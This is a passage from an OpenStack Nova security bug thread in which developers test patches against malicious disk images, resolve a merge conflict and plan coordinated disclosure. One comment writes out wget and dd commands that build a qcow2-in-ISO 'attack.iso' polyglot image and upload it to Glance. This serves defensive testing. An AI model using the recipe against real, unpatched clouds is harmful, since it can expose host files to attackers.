<p>All of the bad ones fail to boot, the good ones succeed, and all the non-raw ones are also uploaded as raw and fail to boot, even if they&#x27;re otherwise harmless because we reject the disk_format mismatch. I&#x27;ve got that in a bash script locally, which we clearly need to get into automation (in python of course) somewhere at some point.</p>
<p>*tested with use_cow_images=True and False</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Still looking for detailed confirmation of the new patch, but I've now tested the latest version locally in devstack. I also am collecting a list of images, which hopefully are self-explanatory from the names:

bad-qcow-with-backing.qcow2
bad-qcow-with-datafile.qcow2
bad-vmdk-flat-expose.qcow2
bad-vmdk-flat-expose.vmdk
bad-vmdk-sparse-nbdurl.vmdk
good-qcow.qcow2
good-raw.raw
good-sparse-vmdk.vmdk
good-stream-vmdk.vmdk

All of the bad ones fail to boot, the good ones succeed, and all the non-raw ones are also uploaded as raw and fail to boot, even if they're otherwise harmless because we reject the disk_format mismatch. I've got that in a bash script locally, which we clearly need to get into automation (in python of course) somewhere at some point.

*tested with use_cow_images=True and False</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/14" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-05T18:14:26.513339+00:00" title="2024-07-05 18:14:26 UTC">on 2024-07-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/14"> #14</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;ve added gibi from the nova team as well, since Sylvain will be out next week and I will be as well after Monday.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I've added gibi from the nova team as well, since Sylvain will be out next week and I will be as well after Monday.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/15" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-05T21:16:14.305226+00:00" title="2024-07-05 21:16:14 UTC">on 2024-07-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/15"> #15</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;ve also tested this on top of Sean&#x27;s latest (at this moment) iso regression fix and it catches and rejects these two additional images:</p>
<p>bad-iso-<wbr />with-qcow.<wbr />iso<br />
good.iso</p>
<p>without regressing any of the others mentioned above.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I've also tested this on top of Sean's latest (at this moment) iso regression fix and it catches and rejects these two additional images:

bad-iso-with-qcow.iso
good.iso

without regressing any of the others mentioned above.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/16" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-08T16:47:18.796544+00:00" title="2024-07-08 16:47:18 UTC">on 2024-07-08</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/16"> #16</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  <a href="https://bugs.launchpad.net/nova/+bug/2071734/comments/16/+download">Download full text</a> (6.0 KiB)
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I have tested the change proposed by Dan on top of my changes for iso support. To do this I created an attack.iso image via the following commands:<br />
```<br />
# download known working images<br />
wget <a rel="nofollow" href="http://download.cirros-cloud.net/0.6.2/cirros-0.6.2-x86_64-disk.img">http://<wbr />download.<wbr />cirros-<wbr />cloud.net/<wbr />0.6.2/cirros-<wbr />0.6.2-x86_<wbr />64-disk.<wbr />img</a><br />
wget <a rel="nofollow" href="https://dl-cdn.alpinelinux.org/alpine/v3.20/releases/x86_64/alpine-standard-3.20.1-x86.iso">https:/<wbr />/dl-cdn.<wbr />alpinelinux.<wbr />org/alpine/<wbr />v3.20/releases/<wbr />x86_64/<wbr />alpine-<wbr />standard-<wbr />3.20.1-<wbr />x86.iso</a><br />
# copy iso to serve as target file<br />
cp alpine-<wbr />standard-<wbr />3.20.1-<wbr />x86.iso attack.iso<br />
dd if=cirros-<wbr />0.6.2-x86_<wbr />64-disk.<wbr />img of=attack.iso bs=32K count=1<br />
dd if=alpine-<wbr />standard-<wbr />3.20.1-<wbr />x86.iso of=attack.iso bs=32K skip=1 seek=1<br />
```<br />
we can verify the image using file and qemu-img<br />
```<br />
ubuntu@<wbr />devstack-<wbr />bugfix:<wbr />~$ qemu-img info --output json  attack.iso<br />
{<br />
&nbsp;&nbsp;&nbsp;&nbsp;&quot;virtual-size&quot;: 117440512,<br />
&nbsp;&nbsp;&nbsp;&nbsp;&quot;filename&quot;: &quot;attack.iso&quot;,<br />
&nbsp;&nbsp;&nbsp;&nbsp;&quot;cluster-size&quot;: 65536,<br />
&nbsp;&nbsp;&nbsp;&nbsp;&quot;format&quot;: &quot;qcow2&quot;,<br />
&nbsp;&nbsp;&nbsp;&nbsp;&quot;actual-size&quot;: 168824832,<br />
&nbsp;&nbsp;&nbsp;&nbsp;&quot;format-<wbr />specific&quot;<wbr />: {<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;type&quot;: &quot;qcow2&quot;,<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;data&quot;: {<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;compat&quot;<wbr />: &quot;1.1&quot;,<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;compressi<wbr />on-type&quot;<wbr />: &quot;zlib&quot;,<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;lazy-<wbr />refcounts&quot;<wbr />: false,<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;refcount-<wbr />bits&quot;: 16,<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;corrupt&quot;<wbr />: false,<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;extended-<wbr />l2&quot;: false<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />
&nbsp;&nbsp;&nbsp;&nbsp;},<br />
&nbsp;&nbsp;&nbsp;&nbsp;&quot;dirty-flag&quot;: false<br />
}<br />
ubuntu@<wbr />devstack-<wbr />bugfix:<wbr />~$ file attack.iso<br />
attack.iso: ISO 9660 CD-ROM filesystem data &#x27;alpine-std 3.20.1 x86&#x27; (bootable)<br />
```<br />
I uploaded all 3 files to Glance and uploaded the attack.iso as both raw and iso.</p>
<p>```<br />
openstack --os-cloud devstack-admin image create --file attack.iso --disk-format iso attack-iso<br />
openstack --os-cloud devstack-admin image create --file attack.iso --disk-format raw attack-raw<br />
openstack --os-cloud devstack-admin image create --file alpine-<wbr />standard-<wbr />3.20.1-<wbr />x86.iso --disk-format iso alpine<br />
```</p>
<p>applying dan&#x27;s patch on top of my iso series required resolving one merge conflict in nova/virt/images.py related to  the AttributeError<br />
the resolution is to accept the hunk from dans series</p>
<p>```<br />
-    except AttributeError:<br />
-        # No inspector was found<br />
-        LOG.warning(&#x27;Unable to perform deep image inspection on type %r&#x27;,<br />
-                    img[&#x27;disk_format&#x27;])<br />
-        if disk_format in (&#x27;ami&#x27;, &#x27;aki&#x27;, &#x27;ari&#x27;):<br />
-            # A lot of things can be in a UEC, although it is typically a raw<br />
-            # filesystem. We really have nothing we can do other than treat it<br />
-            # like a &#x27;raw&#x27;, which is what qemu-img will detect a filesystem as<br />
-            # anyway. If someone puts a qcow2 inside, we should fail because<br />
-            # we won&#x27;t do our inspection.<br />
-            disk_format = &#x27;raw&#x27;<br />
-        else:<br />
-            raise exception.<wbr />ImageUnacceptab<wbr />le(<br />
-                image_id=<wbr />image_href,<br />
-                reason=_(&#x27;Image not in a supported format&#x27;))<br />
-<br />
+    except Exception:<br />
+        raise exception.<wbr />ImageUnacceptab<wbr />le(<br />
+            image_id=<wbr />image_href,<br />
+            reason=_(&#x27;Image not in a supported format&#x27;))<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if disk_format == &#x27;iso&#x27;:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# ISO image passed safety check; qemu will treat this as raw from here<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;disk_<wbr />format = &#x27;raw&#x27;<br />
-<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return disk_format<br />
```</p>
<p>note it is very important to keep<br />
```<br />
&nbsp;if disk_format == &#x27;iso&#x27;:<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# ISO image passed safety check; qemu will treat this as raw from here<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;disk_<wbr />format = &#x27;raw&#x27;<br />
```<br />
after the` except Exception:` block and ...</p></div>
    
    <p>
      <a href="/nova/+bug/2071734/comments/16">Read more...</a>
    </p>
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I have tested the change proposed by Dan on top of my changes for iso support. To do this I created an attack.iso image via the following commands:
```
# download known working images
wget http://download.cirros-cloud.net/0.6.2/cirros-0.6.2-x86_64-disk.img
wget https://dl-cdn.alpinelinux.org/alpine/v3.20/releases/x86_64/alpine-standard-3.20.1-x86.iso
# copy iso to serve as target file
cp alpine-standard-3.20.1-x86.iso attack.iso
dd if=cirros-0.6.2-x86_64-disk.img of=attack.iso bs=32K count=1
dd if=alpine-standard-3.20.1-x86.iso of=attack.iso bs=32K skip=1 seek=1
```
we can verify the image using file and qemu-img
```
ubuntu@devstack-bugfix:~$ qemu-img info --output json  attack.iso 
{
    "virtual-size": 117440512,
    "filename": "attack.iso",
    "cluster-size": 65536,
    "format": "qcow2",
    "actual-size": 168824832,
    "format-specific": {
        "type": "qcow2",
        "data": {
            "compat": "1.1",
            "compression-type": "zlib",
            "lazy-refcounts": false,
            "refcount-bits": 16,
            "corrupt": false,
            "extended-l2": false
        }
    },
    "dirty-flag": false
}
ubuntu@devstack-bugfix:~$ file attack.iso 
attack.iso: ISO 9660 CD-ROM filesystem data 'alpine-std 3.20.1 x86' (bootable)
```
I uploaded all 3 files to Glance and uploaded the attack.iso as both raw and iso.

```
openstack --os-cloud devstack-admin image create --file attack.iso --disk-format iso attack-iso
openstack --os-cloud devstack-admin image create --file attack.iso --disk-format raw attack-raw
openstack --os-cloud devstack-admin image create --file alpine-standard-3.20.1-x86.iso --disk-format iso alpine
```

applying dan's patch on top of my iso series required resolving one merge conflict in nova/virt/images.py related to  the AttributeError 
the resolution is to accept the hunk from dans series

```
-    except AttributeError:
-        # No inspector was found
-        LOG.warning('Unable to perform deep image inspection on type %r',
-                    img['disk_format'])
-        if disk_format in ('ami', 'aki', 'ari'):
-            # A lot of things can be in a UEC, although it is typically a raw
-            # filesystem. We really have nothing we can do other than treat it
-            # like a 'raw', which is what qemu-img will detect a filesystem as
-            # anyway. If someone puts a qcow2 inside, we should fail because
-            # we won't do our inspection.
-            disk_format = 'raw'
-        else:
-            raise exception.ImageUnacceptable(
-                image_id=image_href,
-                reason=_('Image not in a supported format'))
-
+    except Exception:
+        raise exception.ImageUnacceptable(
+            image_id=image_href,
+            reason=_('Image not in a supported format'))
     if disk_format == 'iso':
         # ISO image passed safety check; qemu will treat this as raw from here
         disk_format = 'raw'
-
     return disk_format
```

note it is very important to keep 
```
 if disk_format == 'iso':
         # ISO image passed safety check; qemu will treat this as raw from here
         disk_format = 'raw'
```
after the` except Exception:` block and before the return in do_image_deep_inspection or it will regress iso support.

with the above code change, I can confirm that both the qcow in iso(attack-iso) and qcow in iso uploaded as raw (attack-raw) images are correctly identified by nova and rejected.

nova internally raise 
```
nova.image.format_inspector.ImageFormatError: Multiple formats detected: qcow2, iso
```
and 
```
nova.exception.ImageUnacceptable: Image 4acaaf0b-28d9-44cd-952c-9367c10e63f4 is unacceptable: Image content does not match disk_format
```
without dan's patch nova will raise

```
nova.image.format_inspector.ImageFormatError: Multiple formats detected: qcow2, iso 
```

with `[DEFAULT]/force_raw_images = True` (the default)
and  if `[DEFAULT]/use_cow_images = True`

the iso series is enough to detect this bad image.

dan's patch closed the gap for`[DEFAULT]/ Use_cow_images = False`

Additionally, I have tested using the test image provided by dan which reproduces the qcow data-file and vmdk attack vectors.

to do this i uploaded the bad-qcow-with-datafile.qcow2 image and bad-vmdk-flat-expose.vmdk images to an unpatched glance and then attempeted to boot a vm.

bad-qcow-with-datafile.qcow2 correctly raised 
```
nova.exception.ImageUnacceptable: Image ef26ffff-aaeb-4589-b657-08d77dee5005 is unacceptable: Image does not pass safety check
```
and
```
nova.exception.ImageUnacceptable: Image ef26ffff-aaeb-4589-b657-08d77dee5005 is unacceptable: Image not in a supported format
```
and the vmdk raised
```
nova.exception.ImageUnacceptable: Image 0bee1191-7694-4ec2-8260-5f526df78d7a is unacceptable: Image content does not match disk_format
```
and 
```
nova.exception.ImageUnacceptable: Image 0bee1191-7694-4ec2-8260-5f526df78d7a is unacceptable: Image not in a supported format
```

Observations:
if a malicious image is already in the compute node image cache, with the new changes applied creating a new VM will not be blocked by this code
since the image is already present but will instead fail to resize the image correctly resulting in a vm in the error state.
To mitigate this we need to update the errata / OSSA to say that the image cache should be purged as part of mitigating this CVE to ensure
no existing bad images are present. 

A follow-up change to Nova could be created to detect "bad" images in the cache on startup but, I would suggest not doing that in this patch as the exact correct course of action to take is not clear.  The workload and instance owner may not be aware of this so we should not just delete the image on startup and break existing instances, we should at a minimum warn the operator of this situation. We may further choose to stop the nova-compute agent from starting to treat the presence of a bad image as a hard error. This is out of the scope of preventing new images from being used that fail our safety checks and as such can be addressed in a separate patch.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/17" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~danms" class="sprite person">Dan Smith (danms)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-08T16:52:32.707661+00:00" title="2024-07-08 16:52:32 UTC">on 2024-07-08</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/17"> #17</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Thanks Sean!</p>
<p>The iso fix is in the gate now:</p>
<p><a rel="nofollow" href="https://review.opendev.org/c/openstack/nova/+/923533">https:/<wbr />/review.<wbr />opendev.<wbr />org/c/openstack<wbr />/nova/+<wbr />/923533</a></p>
<p>My suggestion for next steps would be:</p>
<p>1. Wait for that to merge<br />
2. Replace the patch here with one based on that and the conflict properly resolved<br />
3. Give it a day or two to marinate amongst the people cc&#x27;d here (ideally with some positive acks)<br />
4. Push ahead on the stakeholder notification</p>
<p>Unless we have a lot of problems with step 1, I&#x27;d say we could shoot for Wednesday or Thursday for step 4.</p>
<p>Thoughts?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Thanks Sean!

The iso fix is in the gate now:

https://review.opendev.org/c/openstack/nova/+/923533

My suggestion for next steps would be:

1. Wait for that to merge
2. Replace the patch here with one based on that and the conflict properly resolved
3. Give it a day or two to marinate amongst the people cc'd here (ideally with some positive acks)
4. Push ahead on the stakeholder notification

Unless we have a lot of problems with step 1, I'd say we could shoot for Wednesday or Thursday for step 4.

Thoughts?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/18" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~sean-k-mooney" class="sprite person">sean mooney (sean-k-mooney)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-08T17:20:37.114605+00:00" title="2024-07-08 17:20:37 UTC">on 2024-07-08</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/18"> #18</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>i agree with dans timeline.</p>
<p>i suspect that is quite doable to do step 2 tomorrow or later today depending on how long step 1 takes.</p>
<p>Wednesday or Thursday for step 4 seams reasonable to me but ill defer to others on that.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">i agree with dans timeline.

i suspect that is quite doable to do step 2 tomorrow or later today depending on how long step 1 takes.

Wednesday or Thursday for step 4 seams reasonable to me but ill defer to others on that.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/19" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~fungi" class="sprite person">Jeremy Stanley (fungi)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-08T17:38:57.484677+00:00" title="2024-07-08 17:38:57 UTC">on 2024-07-08</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/19"> #19</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Downstream stakeholder advance notification on Thursday would be ideal. We generally avoid sending such notifications Friday through Monday, preferring Tuesday/<wbr />Wednesday/<wbr />Thursday for better visibility. If we send it Thursday of this week, I would plan for public disclosure the following Thursday (2024-07-18) in order to give everyone time to apply the new patches.</p>
<p>In the current state, and so close to last week&#x27;s advisory, I&#x27;m inclined to consider this errata to OSSA-2024-001 and widely announce an amendment to the existing advisory, calling out the additional patches and guidance.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Downstream stakeholder advance notification on Thursday would be ideal. We generally avoid sending such notifications Friday through Monday, preferring Tuesday/Wednesday/Thursday for better visibility. If we send it Thursday of this week, I would plan for public disclosure the following Thursday (2024-07-18) in order to give everyone time to apply the new patches.

In the current state, and so close to last week's advisory, I'm inclined to consider this errata to OSSA-2024-001 and widely announce an amendment to the existing advisory, calling out the additional patches and guidance.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/20" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~zmiele" class="sprite person">Zack Miele (zmiele)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-08T19:31:50.282156+00:00" title="2024-07-08 19:31:50 UTC">on 2024-07-08</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/20"> #20</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hey Fungi, a quick question on process here, do you intend to get another CVE assigned for this issue as well? Strictly for this regression I mean. It would certainly help downstreams track things to make sure all necessary fixes are accounted for.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hey Fungi, a quick question on process here, do you intend to get another CVE assigned for this issue as well? Strictly for this regression I mean. It would certainly help downstreams track things to make sure all necessary fixes are accounted for.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/21" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~thomas-goirand" class="sprite person">Thomas Goirand (thomas-goirand)</a>
            wrote
            <time itemprop="commentTime" datetime="2024-07-09T02:08:12.675703+00:00" title="2024-07-09 02:08:12 UTC">on 2024-07-09</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/nova/+bug/2071734/comments/21"> #21</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hi there!</p>
<p>I don&#x27;t understand. We&#x27;re already setting-up a clock for disclosure, but there&#x27;s no patch available here that applies on top of the ISO fix from Sean. Could you please post a patch, give me a bit of time to have it backported, and see if it fits, before rushing into further stress?</p>
<p>Cheers,</p>
<p>Thomas Goirand (zigo)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hi there!

I don't understand. We're already setting-up a clock for disclosure, but there's no patch available here that applies on top of the ISO fix from Sean. Could you please post a patch, give me a bit of time to have it backported, and see if it fits, before rushing into further stress?

Cheers,

Thomas Goirand (zigo)
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/nova/+bug/2071734/comments/22" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
